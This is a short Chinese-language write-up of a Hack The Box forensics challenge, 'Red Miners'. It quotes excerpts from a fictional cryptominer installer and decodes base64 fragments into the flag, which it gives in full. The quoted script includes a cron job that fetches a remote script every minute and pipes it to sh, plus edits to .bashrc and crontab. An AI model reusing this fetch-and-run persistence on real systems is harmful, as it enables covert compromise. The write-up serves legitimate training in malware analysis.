# Red Miners

:::note  CHALLENGE DESCRIPTION

VERY EASY

In the race for Vitalium on Mars, the villainous Board of Arodor resorted to desperate measures, needing funds for their mining attempts. They devised a botnet specifically crafted to mine cryptocurrency covertly. We stumbled upon a sample of Arodor's miner's installer on our server. Recognizing the gravity of the situation, we launched a thorough investigation. With you as its leader, you need to unravel the inner workings of the installation mechanism. The discovery served as a turning point, revealing the extent of Arodor's desperation. However, the battle for Vitalium continued, urging us to remain vigilant and adapt our cyber defenses to counter future threats.

:::

福建提供了一个恶意载荷的部署脚本 `miner_installer.sh`

在其中，基于关键词 `HTB` 抓取关键信息

```shell
echo "ZXhwb3J0IHBhcnQ0PSJfdGgzX3IzZF9wbDRuM3R9Ig==" | base64 -d >> /home/$USER/.bashrc

------

check_if_operation_is_active() {
  local url="http://tossacoin.htb/cGFydDI9Il90aDMxcl93NHkiCg=="

  if curl --silent --head --request GET "$url" | grep "200 OK" >/dev/null; then
    echo "Internet is enabled."
  else
    exit 1
  fi
}

------

crontab -l | sed '/#wget/d' | crontab -
crontab -l | sed '/#curl/d' | crontab -
crontab -l | grep -e "tossacoin.htb" | grep -v grep
if [$? -eq 0]; then
  echo "cron good"
else
  (
    crontab -l 2>/dev/null
    echo '* * * * * $LDR http://tossacoin.htb/ex.sh | sh & echo -n cGFydDE9IkhUQnttMW4xbmciCg==|base64 -d > /dev/null 2>&1'
  ) | crontab -
fi

------

checkExists() {
  CHECK_PATH=$1
  MD5=$2
  sum=$(md5sum $CHECK_PATH | awk '{ print $1}')
  retval=""
  if ["$MD5" = "$sum"]; then
    echo >&2 "$CHECK_PATH is $MD5"
    retval="true"
  else
    echo >&2 "$CHECK_PATH is not $MD5, actual $sum"
    retval="false"
  fi

  dest=$(echo "X3QwX200cnN9Cg=="|base64 -d)
  if [[! -d $dest]];
  then
    mkdir -p "$BIN_PATH/$dest"
  fi
  cp $CHECK_PATH $BIN_PATH/$dest
  echo "$retval"
}
```

找到 Base64 编码后的数据

```plaintext
cGFydDE9IkhUQnttMW4xbmciCg== --> part1="HTB{m1n1ng"
cGFydDI9Il90aDMxcl93NHkiCg== --> part2="_th31r_w4y"
X3QwX200cnN9Cg== --> _t0_m4rs}
ZXhwb3J0IHBhcnQ0PSJfdGgzX3IzZF9wbDRuM3R9Ig== --> export part4="_th3_r3d_pl4n3t}"
```

```plaintext title="Flag"
HTB{m1n1ng_th31r_w4y_t0_m4rs_th3_r3d_pl4n3t}
```
